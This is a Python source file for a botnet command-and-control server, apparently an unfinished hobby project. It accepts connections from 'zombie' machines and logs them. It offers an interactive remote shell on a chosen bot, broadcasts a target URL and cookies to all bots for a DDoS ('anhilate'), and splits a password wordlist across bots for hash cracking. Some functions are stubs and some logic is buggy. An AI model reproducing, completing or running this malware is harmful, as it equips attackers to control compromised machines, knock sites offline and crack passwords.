import socket
#For logging time
import time
import os
#For clean exit we use sys
import sys
import threading
import pickle
import multiprocessing as Process

class CnC:
    def __init__(self):
        #Initialising variables and socket (check for additional steps here for windows machines)
        self.target = "0.0.0.0"
        self.port = 9999
        self.Ccomand = ''
        self.Active = []
        #Client Sockets
        self.sockets = []
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.id = 1
        #1 for Commands 2 for DDoS 3 for Hashcracker
        self.option = 0
        #This is not the fix for freeing up socket
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def server_loop(self):
        try:
            self.socket.bind((self.target,self.port))
            self.socket.listen(3)
            print(f'<*> Listening on {self.target}:{self.port}')
        except socket.error:
            print("Could not create socket for the server")
            sys.exit()
        while True:
            client_socket, addr = self.socket.accept()
            self.Active.append(addr)
            self.sockets.append((self.id,client_socket,addr))
            client_thread = threading.Thread(target=self.handler,args=(client_socket,addr))
            print("Starting a new thread")
            client_thread.start()
            self.id += 1
        os.remove("temp")
    
    def handler(self,client_socket,addr):
        response = client_socket.recv(4096)
        print("<*> Receiving data...")
        with open("logs","a") as f:
            s = time.asctime() + ': ' + f'({addr[0]}:{addr[1]}) ' + response.decode('utf-8')
            print(s)
            f.write(s)
            if s.split()[-1] == 'system!':
                zombie = input("Zombie Name: ")
                client_socket.send(bytes(zombie,'utf-8'))
            else:
                client_socket.send(b"ACK")
        with open("temp","a+") as t:
                t.write(str(addr[0]) + ':' + str(addr[1])+'\n')
        if self.id == 2:
            print("Flag")
            self.options(client_socket,addr)
    def options(self,client_socket,client_addr):
        while True:
            self.Ccommand = input("<*> ")
            #List active connections etc.
            if self.Ccommand == 'list':
                self.list()
            elif self.Ccommand == 'activate':
                self.activate()
            #For commandline execution
            elif self.Ccommand == 'connect':
                for i in self.sockets:
                    print(f"{i[0]}) {i[2][0]}:{i[2][1]}")
                id = int(input("Enter the id of the zombie you'd like to connect to: "))
                self.connect(self.sockets[id-1][1])
            #For sending some sort of file
            elif self.Ccommand == 'send':
                self.send()
            #For DDoS
            elif self.Ccommand == 'anhilate':
                self.anhilate()
                #Check how to send the query for DoS
                #client_socket.send(query)
            elif self.Ccommand == 'hashcracker':
                self.hashcracker()
            #In working
            elif self.Ccommand == 'update':
                self.update()
            elif self.Ccommand == 'disengage':
                self.disengage()
        #client_socket.close()

    def split(self,list_a, chunk_size):
        for i in range(0, len(list_a), chunk_size):
            yield list_a[i:i + chunk_size]
    
    def list(self):
        x = 1
        for i in self.Active:
            print(str(x)+") "+i[0]+ ":" + str(i[1]))
            x += 1

    def activate(self):
        pass

    def connect(self,client_socket):
        print('<*> Initialising shell at system')
        time.sleep(1)
        print('<*> Shell initialised!')
        command = ''
        while command != 'terminate\n' or 'exit\n':
            client_socket.send(bytes("pwd",'utf-8'))
            dir = client_socket.recv(4096).decode().strip("\n")
            command = input(dir+'> ')
            #command = input("<*SHELL*> ")
            if (command.lower() != ('terminate' or 'exit')) or (command != ""):
                #print(command)
                self.option = 1
                client_socket.send(pickle.dumps((self.option,command)))
                print(client_socket.recv(4096).decode(),end="")
            elif command.lower() == 'terminate' or 'exit':
                break
    
    def send(self):
        pass

    def anhilate(self):
        option = str(input("Press 1 for program assisted request or 2 for manually entering the request: "))
        if option == '1':
            url = input("Enter the url here: ")
            cookies = {}
            if input("Are there any cookies? (Y or N): ").lower() == 'y':
                key = ' '
                print("First enter the cookie key then the cookie value (cookie_key=cookie_value)")
                while key != '':
                    key = str(input("Enter cookie key: "))
                    value = str(input("Enter cookie value: "))
                    if key != '':
                        cookies[key] = value
            for i in self.sockets:
                i[1].send(pickle.dumps((self.option,url,cookies)))
        if option == '2':
            return 'a'


    def hashcracker(self):
        temp = []
        passwd = []
        with open("chhotawordlist","r") as r:
            print("Opening File")
            temp = r.readlines()
        list_len = len(temp) / (self.id-1)
        for x in temp:
            passwd.append(x.strip('\n'))
        i = 0
        lists = list(self.split(passwd,int(list_len)))
        print(len(lists))
        while i < (self.id - 1):
            self.sockets[i][1].send(pickle.dumps(lists[i]))
            i +=1
        

    def update(self):
        pass

    def disengage(self):
        pass

def main():
    print('''
<*> Welcome to the Co-ordinate
<*> The fate of the Eldians lie on your hands
<*> To begin type help to see the available commands''')
    server = CnC()
    while True:
        #server.Ccommand = input("<*> ")
        server.server_loop()
        server.options()

if __name__ == '__main__':
    main()
    '''server = CnC()
    x = [1,2,3,4,5,6,7,8,9]
    print(list(server.split(x,2)))'''